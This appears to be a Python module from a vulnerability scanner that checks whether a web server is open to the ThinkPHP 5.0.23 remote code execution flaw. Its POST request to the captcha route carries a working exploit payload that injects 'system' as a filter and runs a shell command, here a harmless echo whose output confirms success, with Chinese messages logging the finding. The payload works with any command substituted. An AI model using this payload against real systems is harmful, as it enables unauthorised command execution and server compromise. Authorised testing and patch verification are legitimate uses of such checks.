# -*-coding:utf-8-*-
import requests

class tp5023:
    def check_tp5023(self, url):
        url = url + r"/index.php?s=captcha"
        data = {
            "_method": "__construct",
            "filter[]": "system",
            "method": "get",
            "server[REQUEST_METHOD]": "echo ecat"
        }
        re = requests.post(url, data).text
        if "ecat" in re:
            print("    \033[0;36;31m存在Thinkphp5.0.23远程代码执行漏洞!\033[0m")
            with open("tp_check.log", "a+") as res:
                res.write("存在Thinkphp5.0.23远程代码执行漏洞!\n\n")
            res.close()